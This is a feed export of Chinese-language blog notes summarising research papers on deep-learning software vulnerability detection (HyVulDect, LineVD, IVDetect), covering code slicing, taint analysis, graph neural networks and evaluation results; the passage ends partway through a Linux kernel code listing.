代码序列：方法M的代码标记序列在VD中很重要，因为它包含具体的词法值。我们使用lexer来解析和收集给定方法中的所有词法代码标记。我们将语句视为句子，将代码标记视为单词，并使用嵌入模型来生成所有代码标记的向量表示。在获得所有令牌的嵌入后，我们使用门控递归单元（GRU）[29]来生成整个序列的向量。然后，我们应用空间金字塔池（SPP）[30]来逐步减小GRU产生的向量的空间大小。最后，我们在给定的方法M中获得了表示代码序列的特征向量FCS。</p><p>2） AST上的长路径：作为源代码的重要组成部分，抽象语法树（AST）承载着结构和句法信息。直接使用基于树的嵌入模型的AST结构可能会产生较高的计算成本。相反，我们选择长路径而不是从方法体构建的AST。长路径是指从一个叶节点开始，到另一个叶结点结束，并通过AST的根节点的路径。如先前的工作[31]、[32]所示，可以通过AST节点上具有特定长度的路径来捕获和表示AST结构。以长路径中的节点为例，我们使用嵌入模型、基于注意力的GRU层[33]（对于AST结构），然后使用SPP[30]来构建表示给定方法的长路径的向量FLP（第IV节）。</p><p>3） 后支配树（PDT）：我们首先根据Ferrante等人[21]中的算法构建PDT。由于PDT是树形结构的，我们选择使用tree-LSTM[27]来执行PDT的表示学习，这是一种基于树的神经网络模型，已在源代码中表现良好。另一种设计是将支配后关系添加到EFG中，并使用基于图的神经网络模型来学习表示。我们不选择这种替代方案，因为基于图的模型必须学会区分PDT和EFG中的两种类型的关系。PDT中的每个节点都是一个语句。我们将标记视为单词，将语句视为句子，并使用嵌入模型来构建所有标记的向量。嵌入将经过SPP，然后使用树LSTM模型来生成该方法的特征向量FPDT（第五节）。</p><p>4） 异常流图（EFG）：我们遵循Allen和Horwitz[20]中的算法为给定的方法构建EFG。与PDT中一样，每个EFG节点代表一个语句，因此，我们使用单词嵌入模型和SPP层执行相同的过程来为每个语句生成向量。在这一步骤之后，我们获得了一个图结构，其中每个节点（语句）都由一个向量表示。最后，我们将该图结构作为LabelGCN模型的输入，以生成特征向量FEFG（第六节）。</p><p>5） 调用关系：对于方法M，我们考虑调用方/被调用方方法中的调用/被调用语句。与M中的调用/被调用语句和M的调用/被叫语句一起，我们构建了一个星形图。该图中的每个节点都表示一个语句，因此，对于节点内容，我们使用与上面相同的过程来构建语句的向量。我们还应用网络嵌入Node2Vec[34]对节点进行编码。将表示节点内容和调用结构的向量组合以产生特征向量FCR（第VII节）。最后，使用多层感知器对所有的特征向量进行分类。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403212107473.png" alt="image-20240321210748419"></p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><h4 id="31-dataset-and-process">3.1 DataSet and Process</h4><h4 id="32-evaluation">3.2 <strong>Evaluation</strong></h4><h2 id="4-conclusion">4 Conclusion</h2><h2 id="summary">Summary</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HyVulDect A hybrid semantic vulnerability mining system based on graph neural network</title>
      <link href="/2023/12/18/Papers/Vul/HyVulDect%20A%20hybrid%20semantic%20vulnerability%20mining%20system%20based%20on%20graph%20neural%20network/"/>
      <url>/2023/12/18/Papers/Vul/HyVulDect%20A%20hybrid%20semantic%20vulnerability%20mining%20system%20based%20on%20graph%20neural%20network/</url>
      
        <content type="html"><![CDATA[<h2 id="0-abstract">0 Abstract</h2><p>提出了一个基于混合语义的图神经网络漏洞挖掘系统HyVulDect，该系统基于漏洞的原因构建了一个复合语义代码属性图用于代码表示。使用门控图神经网络来提取深层语义信息。由于大多数漏洞都与数据流相关，我们使用污点分析来提取污点传播链，使用BiLSTM模型来提取上下文的令牌级特征，最后使用分类器对融合特征进行分类。我们引入了一种双重关注机制，使模型能够专注于与漏洞相关的代码，使其更适合于漏洞挖掘任务。实验结果表明，HyVulDect优于现有的最先进的方法，在基准数据集上可以实现92%的准确率。与基于规则的静态挖掘工具Flawfinder、RATS和Cppcheck相比，它具有更好的性能，可以有效地检测实际的CVE源代码漏洞。</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h4 id="11-problem-and-challenge">1.1 Problem and Challenge</h4><p>现有的软件往往是大规模和复杂的，项目的代码量急剧增加。简单使用手动审计代码的成本非常高，而且很难发现触发条件复杂的漏洞。机器学习和深度学习的发展也被广泛用于软件漏洞挖掘。基于传统机器学习的方法需要手动提取漏洞的特征，并依赖于大量的专家知识。基于深度学习方法，将源代码视为一个自然语言序列，并使用现有的自然语言处理方法进行特征表示，总结漏洞的特征进行检测和分类。这些方法可以有效地捕获源代码中由漏洞触发的上下文信息。然而，**没有考虑源代码的结构特征，**此外，在代码表示中丢失了许多语义信息。尽管图神经网络可以处理代码图表示等非欧几里得数据，但现有的方法将源代码表示为AST和CFG，缺乏源代码的数据依赖性信息，不利于漏洞的检测。同时，直接使用程序源代码作为图神经网络的输入，引入了大量冗余代码，不利于模型的学习。</p><h4 id="12-motivation">1.2 Motivation</h4><h4 id="13-contribution">1.3 Contribution</h4><p>我们提出了一种基于混合语义的图神经网络漏洞挖掘系统，该系统利用门控图神经网络和具有双重注意力机制的BiLSTM网络来提取源代码图级和令牌级特征。融合两个维度的深层功能可以有效地用于检测漏洞。</p><p>我们改进了基于API调用的程序切片算法（Li et al.，2021），补充了程序切片的结构，在提取漏洞上下文信息的同时保留了代码的结构信息。</p><p>基于该设计方案的实验表明，HyVulDect的检测性能优于传统的静态扫描工具。与最先进的探测器相比，Devign、VUDDY和BGNN4VD的精度分别提高了27.6%、14.2%和4.9%。同时，它可以有效地检测现有的CVE漏洞。</p><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h4 id="21-system-overview">2.1 System Overview</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403052145289.png" alt="image-20240305214500170"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403052230552.png" alt="image-20240305223038459"></p><p>图7（a）是该程序的源代码，它调用wcscpy函数将宽字符串从源复制到目标。首先，我们定位API函数wcscpy函数，它有两个参数数据和SOURCE_STRING。对于属于用户定义函数F ree_Pointer（）的参数数据，该函数的内部切片由五条语句组成，即程序的第17、18、20、21、23行。第23行的badSink（）函数是一个用户定义的函数，用于接收外部参数数据，该函数的内部切片由四行语句组成，即程序的第0、4、6和12行。对于参数SOURCE_STRING，相关联的语句是第15行、第21行。通过参数数据得到的最终切片序列为：17-&gt;18-&gt;20-&gt;21-&gt;23-&gt;0-&gt;4-&gt;6-&gt;12。通过参数SOURCE_STRING得到的最终切片序列为：15-&gt;21。将两个切片序列按照原来的代码顺序组合起来，去掉重复的代码行，基于API函数wcscpy（）的最终切片代码序列为：0-&gt;4-&gt;6-&gt;12-&gt;15&gt;17-&gt;18-&gt;20-&gt;21-&gt;21-&gt;23-&gt;23。图7（c）显示了基于API函数生成的代码切片，可以看出它有效地减少了代码行数。为了减少语料库的规模，我们一对一地替换用户定义的函数和变量（例如badSink（）-&gt;f unc_0（），data-&gt;var_0）。图7（d）显示了变量命名标准化后的程序切片，有效地减少了令牌的数量。尽管之前的操作有效地提取了与漏洞相关的代码行，并删除了不相关的代码，但源代码的结构不再完整。为了补充源代码的结构信息，我们补充了程序片的结构。我们根据程序源代码的结构来补充代码片的结构。算法1详细描述了程序片结构的补充过程。在解析源代码时，提取代码中用户定义的函数和控制块，以补充切片代码。完成切片后，首先从上到下扫描代码切片。如果这行代码是自定义函数，在这行代码下面加上结构代码“{”，继续向下扫描，直到遇到一行不属于自定义函数的代码，在它前面加上“}”，就完成了对函数结构的补充。对于控制结构，有四种主要结构：if条件语句、switch条件语句、For循环语句和while循环语句。补充逻辑与功能相同。在切片结构的补充过程中，我们遵循这样的原则：首先，完成结构的函数；然后，控制结构，因为控制结构通常包含在功能体中。如图7（e）所示，是最终生成的程序切片。</p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><h4 id="31-dataset-and-process">3.1 DataSet and Process</h4><h4 id="32-evaluation">3.2 <strong>Evaluation</strong></h4><h2 id="4-conclusion">4 Conclusion</h2><h2 id="summary">Summary</h2><aside> 💡 Others<hr><p>污点分析是一种通过程序跟踪和分析污点信息流的技术（Zheng et al., 2019）。 污点是被污染的消息。 在程序分析中，来自外部和进入程序的信息被视为污染信息。 根据分析的需要，程序内部使用的数据也可以作为污点信息，并可以分析与其对应的信息流。 根据污点分析时程序是否运行，可分为静态污点分析和动态污点分析。</p><p>污点分析主要包括污点的来源、污点的汇聚点和消毒剂。污点源是指将污点数据引入到系统中； 污点聚合点是指系统将污点数据输出到敏感数据区或外界，导致敏感数据区被非法改写或隐私数据泄露； sanitizer是指数据传输不再通过数据加密或重新分配等操作损害系统的完整性和机密性。</p><p>污点分析的过程就是识别程序中污点信息的产生点，并对污点信息进行标记； 利用特定的规则来追踪和分析程序中污点信息的传播过程； 并检查关键操作是否会受到某些关键程序点的污点信息的影响。 污点信息的产生点称为源点，污点信息的检查点称为宿点。</p><p>在漏洞分析中，污点分析技术用于将感兴趣的数据（通常来自程序的外部输入，假设所有输入都是危险的）标记为污点数据。 然后通过跟踪与受污染数据相关的信息流，可以了解它们是否会影响某些关键程序操作并探索程序漏洞。 程序是否存在漏洞的问题转化为该操作是否会使用宿点上的污染信息。</p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LineVD_Statement-level Vulnerability Detection using Graph Neural Networks</title>
      <link href="/2023/12/18/Papers/Vul/LineVD-Statement-level-Vulnerability-Detection-using-Graph-Neural-Networks/"/>
      <url>/2023/12/18/Papers/Vul/LineVD-Statement-level-Vulnerability-Detection-using-Graph-Neural-Networks/</url>
      
        <content type="html"><![CDATA[<h2 id="0-abstract">0 Abstract</h2><p>当前基于机器学习的软件漏洞检测方法主要在功能级别进行。然而，这些方法的一个关键限制是，它们没有指示导致漏洞的特定代码行。这限制了开发人员有效检查和解释学习模型预测的能力，这对于将基于机器学习的工具集成到软件开发工作流中至关重要。基于图的模型在功能级漏洞检测方面表现出了良好的性能，但其在语句级漏洞检测中的能力尚未得到广泛探索。**虽然通过可解释的人工智能解释功能级预测是一个很有前途的方向，但我们在这里从完全监督学习的角度来考虑语句级软件漏洞检测任务。**我们提出了一种新的深度学习框架LineVD，它将语句级漏洞检测定义为节点分类任务。**LineVD利用图神经网络和基于转换器的模型对原始源代码标记进行编码，从而利用语句之间的控制和数据依赖性。**特别是，通过解决函数级和语句级信息之间的冲突输出，LineVD显著提高了函数代码在没有漏洞状态的情况下的预测性能。我们针对从多个真实世界项目中获得的大量真实世界C/C++漏洞进行了广泛的实验，并证明F1分数比当前最先进的技术提高了105%.</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h4 id="11-problem-and-challenge">1.1 Problem and Challenge</h4><p>自动化SVD大致可分为两类：</p><p>（1）传统方法，包括静态和动态分析；</p><p>（2）数据驱动解决方案，利用数据挖掘和机器学习来预测软件漏洞；</p><p>尽管当前的数据驱动方法在识别软件漏洞方面取得了成功，但它们往往局限于粗粒度水平。模型输出通常为开发人员提供有限的预测结果验证和解释信息，导致在评估和缓解软件漏洞时付出额外努力。</p><p>许多SVD解决方案已经从文件级过渡到函数级或切片级预测，其他一些工作进一步利用补充信息，如提交级别的代码更改以及附带的日志消息，来构建预测模型。虽然目标是帮助从业者对有缺陷的代码进行优先级排序，但漏洞通常可以局限于几个关键行。因此，审查大型函数仍然可能是一个相当大的负担。</p><h4 id="12-motivation">1.2 Motivation</h4><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312182057555.png" alt="image-20231218205705483" style="zoom:67%;" /><p>为了节省空间，我们从一个较小的函数中选择一个漏洞，该函数包含Linux内核（CVE-2018-12896）中的整数溢出漏洞，该漏洞最终可能被利用来导致拒绝服务。通过显式语句级别的预测，可以更容易地解释为什么函数被预测为易受攻击（或者，验证预测是否错误）。语句级SVD模型将第22行上的加法赋值操作标记为最可疑的，该操作包含易受攻击的整数强制转换操作，使开发人员能够更有效地验证和减轻该漏洞。</p><p>先前的工作利用GNNExplainer来导出易受攻击的语句作为模型的解释，以展示在语句级的工作。然而，在我们的工作中，我们发现在对潜在的脆弱性语句进行分类和排序时，性能是不充分和有效的。或者，我们旨在探索在语句级别直接训练和预测漏洞以进行SVD粒度细化的可行性和有效性，这将允许数据驱动的解决方案以完全监督的方式直接利用任何可用的语句级别信息。</p><h4 id="13-contribution">1.3 Contribution</h4><ul><li>提出了一种新颖有效的语句级SVD方法，LineVD实现了显著的改进，F1得分增加了105%；</li><li>研究了构建基于GNN的语句级SVD模型的每个阶段的性能影响，包括节点嵌入方法和GNN模型选择。根据研究结果，开发LineVD是为了通过同时学习功能和语句级别的信息，在很大程度上提高性能。</li><li>LineVD是第一种通过图神经网络联合学习函数级和语句级信息以提高SVD性能的方法，在经验评估中，它显著优于仅使用一种类型信息的传统模型。</li><li>发布了数据集、源代码和带有支持脚本的模型，这为未来的基准测试和比较工作提供了一个现成的实现解决方案。<a href="https://github.com/davidhin/linevd">https://github.com/davidhin/linevd</a></li></ul><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h4 id="21-system-overview">2.1 System Overview</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312182110490.png" alt="image-20231218211008424"></p><p>首先将问题定义为，节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">V\rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>的映射，也就是语句是否易受攻击。</p><p>通过学习最小化损失loss:</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>i</mi><mi>n</mi><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>L</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>Y</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>V</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">min\sum_{i=1}^nL(f(G_i, Y_i|V_i))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p><strong>Feature Extraction</strong></p><p>LineVD将源代码的单个函数作为原始输入。通过处理函数并将其拆分为单独的语句Vi，首先通过CodeBERT的预训练BPE标记器对每个样本进行标记。在V＝{V1，V2，…，Vn}的集合之后，整个函数和包括该函数的各个语句被传递到CodeBERT中。因此，可以获得函数级和语句级的代码表示。</p><p>具体而言，LineVD分别嵌入了函数级和语句级代码，而不是为函数级嵌入聚合语句级嵌入。CodeBERT是一个双峰模型，这意味着除了函数代码本身之外，它还基于函数的自然语言描述进行了训练。作为输入，它使用一个特殊的分隔符标记来区分自然语言描述和函数代码。虽然函数的自然语言描述是不可访问的，但在这项工作中应用了文献中规定的一般操作，在每个输入前添加一个额外的分隔符标记，使描述为空白。对于CodeBERT的输出，我们使用了分类标记的嵌入，这适用于代码摘要任务。这使我们能够更好地利用CodeBERT模型强大的预训练源代码摘要功能。</p><p>总体而言，使用CodeBERT的LineVD的特征提取组件产生n+1个特征嵌入：一个嵌入用于整个函数，n个嵌入用于每个语句，我们分别表示为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mi>v</mi><mo>=</mo><mrow><msubsup><mi>x</mi><mn>1</mn><mi>v</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mn>2</mn><mi>v</mi></msubsup><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mi>v</mi></msubsup></mrow></mrow><annotation encoding="application/x-tex">Xv={x^v_1,x^v_2,…,x^v_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9125em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span>。</p><p><strong>Graph Construction</strong></p><p>在LineVD中，我们专注于数据和控制相关性信息，为此我们引入了图注意力网络（GAT）模型。如第2.2节所述，图神经网络（GNN）基于信息扩散机制学习图结构数据，而不是将信息压缩成平面向量，平面向量根据图的连通性更新节点状态，以保留重要信息，即拓扑依赖信息。</p><p><strong>Classifier Learning</strong></p><p>目标是训练一个可以同时从函数级和语句级代码中联合学习的模型。为了实现这一点，我们认为函数级和语句级代码片段对预测结果的贡献相等。因此，我们利用函数级CodeBERT嵌入的输入和从GAT层获得的语句嵌入，构建了一组共享的线性层和dropout层。</p><p>虽然易受攻击的语句可能足以指示函数易受攻击，但我们使用元素乘法构建LineVD，以进一步利用函数级别的信息进行训练。此外，这种操作和谐地平衡了函数级和语句级嵌入之间的冲突输出，并将证明某些场景的决策是合理的，即，如果函数级嵌入的输出类为零，那么所有语句级输出也为零。对此的直觉是，非易受攻击的函数不可能具有易受攻击的代码行。</p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><h4 id="31-dataset-and-process">3.1 DataSet and Process</h4><p>最近的研究表明，SVD模型应该根据能够代表真实世界漏洞不同特征的数据进行评估[10]。这意味着评估从真实世界项目中提取的源代码（即非合成的），同时保持不平衡的比率，这是软件项目中漏洞固有的。在现实世界场景中应用时，使用不满足这些条件的数据集会导致模型性能的不一致。另一个数据集要求是足够多的样本，理想情况下跨越多个项目，以便获得一个可以很好地推广到看不见的代码的模型。最后一个要求是在语句级别访问基本事实标签，或可追溯到修复前代码，即原始gitcommit。</p><p><strong>Ground-Truth labels</strong></p><p>为了获得易受攻击和非易受攻击线路的基本事实标签，我们遵循文献[19，32]中的断言，而不是提出我们自己的启发式方法：（1）漏洞修复提交中删除的线路用作易受攻击的线路的指标，以及（2）所有依赖于添加线路的控制或数据的线路也被视为易受攻击。第二点的理由是，在漏洞修复提交中添加的任何行都是为了帮助修补漏洞。因此，在漏洞修复提交中未修改但与这些添加的行相关的行可以被视为与漏洞相关。为了获得与依赖于添加行的行相对应的标签，我们首先获得样本前后版本的代码变化，其中Big Vul中的样本指的是函数级代码片段。对于之前的版本，我们删除所有添加的行，对于之后的版本，删除所有删除的行。在这两种情况下，我们都保留空白占位符行，以确保行号的一致性。从后版本中提取的代码图可用于查找所有依赖于添加行的控制或数据行，这些行的行号对应于前版本。这组线可以与删除的线组合，以获得单个样本的最终脆弱线集。注释行被排除在代码图中，因此不用于训练或预测。这可以从图1和图2中看出；在这种情况下，只有一个修改的行，它被视为删除的行（22）和添加的行（23）。在这种情况下，前后版本的控制和数据依赖边恰好相同，因此我们可以使用图2来识别依赖于第23行的控制/数据的行，即第3、19和21行。</p><p><strong>Cleaning</strong></p><p>原始数据集中的一些样本被错误地截断，导致代码样本无法解析且无效。例如，一个原本是50行的函数可能会因为没有明显原因而被错误地截断为40行。原因可能是数据集最初是如何构建的错误；然而，在整个数据集中只有30个这样的样本。我们使用80:10:10的随机训练/验证/测试分割比。对于训练集，我们对不可破坏样本的数量进行了不足采样，以在函数级别生成近似平衡的数据集，而测试和验证集保持原始的不平衡比例。我们选择在函数级别上平衡样本，因为在语句级别上进行平衡，同时保持函数中语句之间的上下文依赖关系是非常重要的。</p><h4 id="32-evaluation">3.2 <strong>Evaluation</strong></h4><ul><li><p>RQ1：与最先进的基于解释的SVD模型相比，LineVD可以实现多大的性能提升？</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312190937348.png" alt="image-20231219093737314"></p></li><li><p>RQ2：不同的代码嵌入方法如何影响语句级漏洞检测？与其他粒度级别的SVD相比，语句级SVD的代码嵌入方法尚未得到探索。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312190940483.png" alt=""></p></li><li><p>RQ3：图神经网络和函数级信息如何对LineVD性能做出贡献？使用图神经网络的信息传播对语句级SVD的影响还有待探索。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312190942923.png" alt=""></p></li><li><p>RQ4：LineVD在跨项目分类场景中的表现如何？虽然在包含多个项目的数据集上进行训练已经减少了对模型通用性的歪曲，但来自同一项目的样本仍然有可能出现在训练集和测试集中。使用跨项目场景可以更好地表示模型在完全看不见的项目上的表现，而不仅仅是看不到的样本。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312190943968.png" alt="image-20231219094311928"></p></li><li><p>RQ5：对于真实世界的数据，LineVD最能区分哪些语句类型？从语句类型的角度研究模型预测结果，特别是对于真实世界的数据，可以帮助了解模型在哪里表现最好，在哪里失败，这可以指导未来的工作和语句级SVD的改进。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312190943357.png" alt="image-20231219094343320"></p></li></ul><h2 id="4-conclusion">4 Conclusion</h2><p>LineVD，一种用于语句级漏洞检测的新型深度学习方法，它可以让开发人员更有效地评估潜在的漏洞功能。LineVD通过在训练过程中利用图神经网络和语句级信息，在真实世界的开源项目中实现了最先进的语句级漏洞检测。与最新的基于细粒度机器学习的模型相比，这一显著改进表明了直接利用语句级信息进行语句级SVD的有效性。最后，LineVD实现了合理的跨项目性能，表明即使对于完全看不见的软件项目，它也具有有效性和泛化能力。未来的方向将包括探索替代的预训练特征嵌入方法和新的GNN架构，这些架构可以更好地适应软件源代码的底层性质和漏洞。</p><h2 id="summary">Summary</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
            <tag> 代码行级检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IVDetect</title>
      <link href="/2023/12/18/Papers/Vul/IVDetect/"/>
      <url>/2023/12/18/Papers/Vul/IVDetect/</url>
      
        <content type="html"><![CDATA[<h2 id="一背景">一.背景</h2><p>现有的漏洞检测方法大部分只是根据给定代码片段，确认该片段是否包含漏洞（分类）。而并没有指出哪些statement有问题。因此作者提出了IVDetect。主要包括</p><ul><li>用一个新的代码表示方法。作者基于PDG对代码进行表示（源代码用图结构表示），并从PDG提取不同的信息将其向量化。并使用FA-GCN（Graph Convolution Network with feature-attention）对其进行分类。</li><li>用可解释方法（GNNExplainer）对FA-GCN的分类结果进行解释。GNNExplainer基于edge-mask对输入图选取子图进行解释。作者试图找出是哪些statement决定了分类结果。</li></ul><p>作者用三个数据集进行测试： Fan，Reveal，FFMPeg+Qemu</p><h2 id="二motivation">二.motivation</h2><p>example：</p><p>下面展示了linux 4.6的<code>ec_device_ioctl_xcmd</code>方法。这个方法为CromeOS设备构造I/O控制命令。编号为CVE-2016-6156</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">ec_device_ioctl_xcmd</span><span class="params">(<span class="keyword">struct</span> cros_ec_dev *ec, <span class="type">void</span> __user 